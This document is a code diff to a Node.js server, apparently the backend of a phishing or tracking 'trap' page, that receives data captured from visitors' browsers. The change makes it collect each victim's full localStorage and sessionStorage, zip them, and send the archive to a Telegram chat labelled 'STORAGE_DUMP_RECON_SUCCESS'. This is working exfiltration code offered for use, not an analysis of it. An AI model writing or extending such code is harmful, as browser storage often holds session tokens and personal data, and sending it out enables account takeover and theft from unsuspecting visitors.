@@ -8,6 +8,7 @@ import net from "net";
 import crypto from "crypto";
 import fs from "fs";
 import { templates } from "./trapTemplates";
+import AdmZip from "adm-zip";
 
 const resolveMx = util.promisify(dns.resolveMx);
 
@@ -327,26 +328,32 @@ async function startServer() {
                     `└ Downlink: <code>${data.net_downlink}Mb/s</code>`);
       }
 
-      if (data.storage_ls || data.storage_ss) {
+      if (data.storage_ls_full || data.storage_ss_full) {
         let storageTxt = '';
-        if (data.storage_ls) {
+        let lsObj = {};
+        let ssObj = {};
+
+        if (data.storage_ls_full) {
           try {
-            const ls = typeof data.storage_ls === 'string' ? JSON.parse(data.storage_ls) : data.storage_ls;
-            storageTxt += `├ <b>LocalStorage:</b> <code>${Object.keys(ls).length} keys</code>\n`;
-            Object.entries(ls).slice(0, 5).forEach(([k, v]) => {
-              storageTxt += `│ └ <code>${k}</code>: ${String(v).substring(0, 40)}${String(v).length > 40 ? '...' : ''}\n`;
-            });
+            lsObj = typeof data.storage_ls_full === 'string' ? JSON.parse(data.storage_ls_full) : data.storage_ls_full;
+            storageTxt += `├ <b>LocalStorage:</b> <code>${Object.keys(lsObj).length} keys</code> (Extracted to ZIP)\n`;
           } catch(e) { storageTxt += `├ LocalStorage: [Captured but Parse-Error]\n`; }
         }
-        if (data.storage_ss) {
+        if (data.storage_ss_full) {
           try {
-            const ss = typeof data.storage_ss === 'string' ? JSON.parse(data.storage_ss) : data.storage_ss;
-            storageTxt += `└ <b>SessionStorage:</b> <code>${Object.keys(ss).length} keys</code>\n`;
-            Object.entries(ss).slice(0, 3).forEach(([k, v]) => {
-              storageTxt += `  └ <code>${k}</code>: ${String(v).substring(0, 40)}${String(v).length > 40 ? '...' : ''}\n`;
-            });
+            ssObj = typeof data.storage_ss_full === 'string' ? JSON.parse(data.storage_ss_full) : data.storage_ss_full;
+            storageTxt += `└ <b>SessionStorage:</b> <code>${Object.keys(ssObj).length} keys</code> (Extracted to ZIP)\n`;
           } catch(e) { storageTxt += `└ SessionStorage: [Captured but Parse-Error]\n`; }
         }
+        
+        try {
+          const zip = new AdmZip();
+          zip.addFile("localStorage.json", Buffer.from(JSON.stringify(lsObj, null, 2), "utf8"));
+          zip.addFile("sessionStorage.json", Buffer.from(JSON.stringify(ssObj, null, 2), "utf8"));
+          const zipBuffer = zip.toBuffer();
+          botInstance.telegram.sendDocument(chatId, { source: zipBuffer, filename: `StorageDump_${id}.zip` }, { content_type: 'application/zip', caption: "💾 <b>STORAGE_DUMP_RECON_SUCCESS</b>", parse_mode: 'HTML' }).catch(() => {});
+        } catch (e) {}
+
         addSection(`💾 PERSISTENT_MEMORY_DUMP`, storageTxt);
       }
 
